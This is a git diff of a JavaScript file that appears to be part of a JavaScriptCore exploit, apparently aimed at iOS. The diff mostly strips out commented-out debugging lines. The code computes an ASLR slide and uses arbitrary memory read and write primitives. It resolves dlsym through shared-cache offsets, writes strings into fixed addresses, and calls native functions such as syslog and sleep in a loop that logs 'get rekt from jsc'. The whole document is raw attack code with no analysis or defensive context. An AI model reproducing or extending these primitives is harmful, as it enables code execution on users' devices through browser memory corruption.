@@ -24,25 +24,13 @@ function main() {
 	slide = get_our_slide();
 	base = 0x4000 + (slide << 12);
 	slid = (slide << 12);
-//	write_u32(0x144444, slid);
-//	return;
-//	call(slide);
-//	while(true){;;};
-//	call(0x41424344);
 
 	log("slide=0x" + slide.toString(16));
 	log("*(uint8_t*)base = 0x" + read_u8(base).toString(16));
 	log("*(uint16_t*)base = 0x" + read_u16(base).toString(16));
 	log("*(uint32_t*)base = 0x" + read_u32(base).toString(16));
 
-
 	write_u32(0x144444, 0x69691337);
-
-	log("writing to first mapped loc");
-//	write_u32(0x422300, 0x41414141);
-	log("writing to second mapped loc");
-//	write_u32(0x422300, 0x41414141);
-	log("survived both writes!");
 
 	child.a = parent;
 	
@@ -54,31 +42,16 @@ function main() {
 
 	var dlsym_addy = read_u32(0x1a0000 + 24 + slid);
 	var shc_slide = read_u32(0x1a0000 + 20 + slid);
-//	write_u32(0x144444, dlsym_addy);
-//	return;
 	write_str(0x148000, "get rekt from jsc %d (slide=%x)\n\0");
 	write_str(0x149000, "syslog\0");
 	write_str(0x14a000, "sleep\0");
-//	while (true) {
-//		call4arg(call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x149000, 0, 0), 0x28, 0x148000, 0x2, 0x3);
-//		call4arg(call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x14a000, 0, 0), 10, 0x1, 0x2, 0x3);
-//	}
 
 	var i = 0;
 	while (true) {
-//		call4arg(call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x149000, 0, 0), 0x28, 0x148000, i, slide);
-//		call4arg(call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x14a000, 0, 0), 1, 0x1, 0x2, 0x3);
 		calls4arg("syslog\0", 0x28, sptr("get rekt from jsc %d (slide=%x)\n\0"), i, 0);
-//		calls4arg("sleep", 1, 0, 0, 0);
+		calls4arg("sleep", 1, 0, 0, 0);
 		i++;
-//		call4arg(call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x149000, 0, 0), 0x148000, i, 0x2, 0x3);
 	}
-
-//	call(0x9ac54 + (slide << 12));
-//	write_u32(0x1013b8, 0x41414141);
-//	call(0x41414141);
-
-//	call(0x56ab9 + (slide << 12));
 
 	log("still alive");
 };
